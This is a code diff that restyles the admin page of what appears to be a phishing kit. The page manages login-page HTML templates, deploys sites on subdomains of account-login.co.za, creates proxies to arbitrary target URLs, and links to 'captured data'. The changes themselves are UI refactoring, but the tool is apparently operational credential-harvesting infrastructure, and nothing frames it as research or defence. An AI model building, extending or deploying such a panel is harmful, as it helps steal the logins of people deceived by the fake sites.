@@ -4,86 +4,77 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>D-TECH Cloud Admin</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
-        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1 { margin-top: 0; color: #0070f3; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        textarea { height: 150px; font-family: monospace; }
-        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
-        button.btn-danger { background: #d32f2f; }
-        button:hover { opacity: 0.9; }
-        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }
-        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
-        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }
-        .hidden { display: none; }
-        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .nav-links { margin-bottom: 20px; text-align: right; }
-        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
-
-        /* Table Styles */
-        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
-        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }
-        th { background: #fafafa; }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
+    <nav class="navbar">
+        <a href="index.html" class="navbar-brand">
+            <img src="logo.png" alt="D-TECH Logo">
+            D-TECH Admin
+        </a>
         <div class="nav-links">
-            <a href="captures.html">View Captured Data &rarr;</a>
+            <a href="index.html">Deploy</a>
+            <a href="dashboard.html">Dashboard</a>
+            <a href="admin.html" class="active">Admin</a>
         </div>
-        <h1>🚀 Cloud Admin Panel</h1>
+    </nav>
 
-        <div class="tabs">
-            <div class="tab active" onclick="switchTab('templates')">Manage Templates</div>
-            <div class="tab" onclick="switchTab('sites')">Manage Sites</div>
-            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy (Admin)</div>
-        </div>
-
-        <!-- Templates Section -->
-        <div id="templates-section" class="form-section">
-            <h2>Existing Templates</h2>
-            <div id="template-list">Loading...</div>
-
-            <h3>Add New Template</h3>
-            <div class="form-group">
-                <label>Template Name</label>
-                <input type="text" id="tpl-name" placeholder="e.g., login-page-v1">
+    <div class="container">
+        <div class="card">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 1rem;">
+                <h1 style="margin:0;">🚀 Cloud Admin Panel</h1>
+                <a href="captures.html" style="color: var(--primary-color); font-weight: bold; text-decoration: none;">View Captured Data &rarr;</a>
             </div>
-            <div class="form-group">
-                <label>HTML Content</label>
-                <input type="file" id="tpl-file" accept=".html,.txt" onchange="loadFile(this, 'tpl-content')" style="margin-bottom: 10px;">
-                <textarea id="tpl-content" placeholder="<html>...</html>"></textarea>
-            </div>
-            <button onclick="saveTemplate()">Save Template</button>
-        </div>
 
-        <!-- Sites Section -->
-        <div id="sites-section" class="form-section hidden">
-            <h2>Manage Deployed Sites</h2>
-            <button onclick="loadSites()" style="width:auto; margin-bottom:10px;">Refresh List</button>
-            <div id="site-list">Loading...</div>
-        </div>
-
-        <!-- Proxy Form (Legacy Admin Feature) -->
-        <div id="proxy-section" class="form-section hidden">
-            <p>Admin-only proxy deployment (bypasses templates).</p>
-            <div class="form-group">
-                <label>Subdomain</label>
-                <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('templates')">Manage Templates</div>
+                <div class="tab" onclick="switchTab('sites')">Manage Sites</div>
+                <div class="tab" onclick="switchTab('proxy')">Deploy Proxy (Admin)</div>
             </div>
-            <div class="form-group">
-                <label>Target URL</label>
-                <input type="text" id="proxy-url" placeholder="https://example.com">
-            </div>
-            <button onclick="saveProxy()">Create Proxy</button>
-        </div>
 
-        <div id="message"></div>
+            <!-- Templates Section -->
+            <div id="templates-section" class="form-section">
+                <h2>Existing Templates</h2>
+                <div id="template-list">Loading...</div>
+
+                <h3 style="margin-top: 2rem;">Add New Template</h3>
+                <div class="form-group">
+                    <label>Template Name</label>
+                    <input type="text" id="tpl-name" placeholder="e.g., login-page-v1">
+                </div>
+                <div class="form-group">
+                    <label>HTML Content</label>
+                    <input type="file" id="tpl-file" accept=".html,.txt" onchange="loadFile(this, 'tpl-content')" style="margin-bottom: 10px;">
+                    <textarea id="tpl-content" placeholder="<html>...</html>" style="height: 150px; font-family: monospace;"></textarea>
+                </div>
+                <button onclick="saveTemplate()">Save Template</button>
+            </div>
+
+            <!-- Sites Section -->
+            <div id="sites-section" class="form-section hidden">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
+                    <h2>Manage Deployed Sites</h2>
+                    <button onclick="loadSites()" class="btn-secondary" style="width:auto;">Refresh List</button>
+                </div>
+                <div id="site-list">Loading...</div>
+            </div>
+
+            <!-- Proxy Form (Legacy Admin Feature) -->
+            <div id="proxy-section" class="form-section hidden">
+                <p class="text-muted">Admin-only proxy deployment (bypasses templates).</p>
+                <div class="form-group">
+                    <label>Subdomain</label>
+                    <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
+                </div>
+                <div class="form-group">
+                    <label>Target URL</label>
+                    <input type="text" id="proxy-url" placeholder="https://example.com">
+                </div>
+                <button onclick="saveProxy()">Create Proxy</button>
+            </div>
+
+            <div id="message" class="message"></div>
+        </div>
     </div>
 
     <script>
@@ -147,14 +138,13 @@
                         const link = document.createElement('a');
                         link.href = `https://${site}.account-login.co.za`;
                         link.target = '_blank';
+                        link.style.color = 'var(--primary-color)';
                         link.textContent = site;
                         tdName.appendChild(link);
 
                         const tdAction = document.createElement('td');
                         const btn = document.createElement('button');
-                        btn.className = 'btn-danger';
-                        btn.style.width = 'auto';
-                        btn.style.padding = '5px 10px';
+                        btn.className = 'btn-danger btn-sm';
                         btn.textContent = 'Delete';
                         btn.onclick = () => deleteSite(site);
                         tdAction.appendChild(btn);
@@ -225,9 +215,7 @@
 
                         const tdAction = document.createElement('td');
                         const btn = document.createElement('button');
-                        btn.className = 'btn-danger';
-                        btn.style.width = 'auto';
-                        btn.style.padding = '5px 10px';
+                        btn.className = 'btn-danger btn-sm';
                         btn.textContent = 'Delete';
                         btn.onclick = () => deleteTemplate(tpl.name);
                         tdAction.appendChild(btn);
@@ -253,9 +241,10 @@
             const content = document.getElementById('tpl-content').value;
             if (!name || !content) return showMessage('Missing fields', 'error');
 
-            const btn = document.querySelector('button'); // Careful selector
+            const btn = document.querySelector('#templates-section button[onclick="saveTemplate()"]');
             const originalText = btn.innerText;
             btn.innerText = 'Saving...';
+            btn.disabled = true;
 
             try {
                 const res = await fetch(`${WORKER_URL}/api/admin/templates`, {
@@ -281,6 +270,7 @@
                 showMessage(e.message, 'error');
             }
             btn.innerText = originalText;
+            btn.disabled = false;
         }
 
         async function deleteTemplate(name) {
@@ -327,7 +317,7 @@
         function showMessage(text, type) {
             const el = document.getElementById('message');
             el.innerText = text;
-            el.className = type;
+            el.className = 'message ' + type;
             el.style.display = 'block';
         }
 
